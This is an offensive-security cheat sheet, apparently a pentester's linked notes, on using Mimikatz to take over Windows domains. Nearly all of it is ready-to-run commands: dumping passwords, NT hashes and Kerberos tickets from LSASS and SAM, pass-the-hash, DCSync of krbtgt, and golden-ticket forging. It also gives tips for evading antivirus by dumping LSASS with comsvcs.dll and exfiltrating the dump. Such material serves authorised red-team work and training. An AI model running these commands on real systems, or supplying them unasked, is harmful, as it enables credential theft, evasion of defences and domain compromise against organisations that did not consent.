# 🐈 Mimikatz

> Runs **on the Windows target** (needs local admin/SYSTEM). Pulls plaintext passwords, NT hashes, Kerberos tickets and keys straight out of LSASS/LSA, and performs pass-the-hash / overpass-the-hash / golden & silver tickets. When you can't run it on-box, dump LSASS and parse offline with **pypykatz** on Kali.

Part of [[Dumping Windows Hashes]]. Related: [[Pass-the-Hash]] · [[Credential Attacks]] · [[Active Directory]] · [[DCSync & Domain Dominance]] · [[Impacket]]

---

## 🧠 THINK
- Needs **admin → SYSTEM**. Always run `privilege::debug` first, then `token::elevate`.
- `sekurlsa::` reads **LSASS memory** (live logon sessions) → cleartext + NT + tickets.
- `lsadump::` reads the **SAM/LSA/SECRETS** hives → local + cached + machine account.
- AV eats `mimikatz.exe` on sight. Prefer **dump LSASS → parse offline** (pypykatz) to avoid touching AV.
- Never crack what you can **pass** — NT hash + ticket work directly ([[Pass-the-Hash]]).

## 💥 RUN — the opening two lines (always)
```cmd
privilege::debug
token::elevate
```
`privilege::debug` = OK means you have the rights; if it errors you're not admin → [[Windows Privilege Escalation]].

## 💥 DUMP — LSASS (cleartext + NT + tickets)
```cmd
sekurlsa::logonpasswords
```
```cmd
sekurlsa::ekeys
```
Just the tickets in memory (for PtT / reuse):
```cmd
sekurlsa::tickets /export
```

## 💥 DUMP — SAM / LSA / cached (offline hives OK)
```cmd
lsadump::sam
```
```cmd
lsadump::secrets
```
```cmd
lsadump::cache
```

## 💥 PASS-THE-HASH / OVERPASS (spawn as another user)
```cmd
sekurlsa::pth /user:Administrator /domain:CORP /ntlm:<NThash> /run:cmd.exe
```

## 💥 DOMAIN DOMINANCE (on/against a DC)
DCSync one account without touching the DC disk:
```cmd
lsadump::dcsync /domain:corp.local /user:krbtgt
```
Golden ticket (needs krbtgt hash + domain SID):
```cmd
kerberos::golden /user:Administrator /domain:corp.local /sid:<S-1-5-...> /krbtgt:<hash> /ptt
```
→ full path in [[DCSync & Domain Dominance]].

## 🐍 OFFLINE — parse an LSASS dump on Kali (AV-safe)
On target (SYSTEM), dump without mimikatz:
```cmd
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full
```
Exfil `lsass.dmp`, then on Kali:
```bash
pypykatz lsa minidump lsass.dmp
```

## 🔁 FOUND → NEXT
| FINDING | NEXT |
|---|---|
| Cleartext password | reuse everywhere ([[Credential Reuse]]) |
| Local admin NT hash | PtH across subnet ([[Pass-the-Hash]]) |
| Kerberos TGT/TGS exported | pass-the-ticket / reuse ([[Active Directory]]) |
| `krbtgt` hash (DCSync) | golden ticket → domain persist ([[DCSync & Domain Dominance]]) |
| Machine/`$MACHINE.ACC` secret | silver ticket / computer-account abuse |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| `privilege::debug` fails | not admin/SYSTEM → escalate first ([[Windows Privilege Escalation]]) |
| AV kills `mimikatz.exe` | dump LSASS with comsvcs.dll → **pypykatz** offline; or rename/obfuscate |
| `logonpasswords` empty of cleartext | modern Win — use `ekeys`/`sekurlsa::msv` for NT hashes; Kerberos tickets instead |
| LSASS protected (PPL/Credential Guard) | can't read live — use SAM/`lsadump`, or dump via [[Dumping Windows Hashes]] routes |
| dcsync denied | need replication rights (DA / DCSync ACL) → [[AD ACL Abuse]] |

## 📇 CHEAT SHEET
```cmd
privilege::debug
token::elevate
sekurlsa::logonpasswords
lsadump::sam
sekurlsa::pth /user:Administrator /domain:CORP /ntlm:<hash> /run:cmd.exe
```
```bash
pypykatz lsa minidump lsass.dmp        # AV-safe offline parse on Kali
```
**Kill shot:** SYSTEM → `sekurlsa::logonpasswords` → cleartext/NT/tickets → PtH + reuse → lateral / domain ([[Active Directory]]).
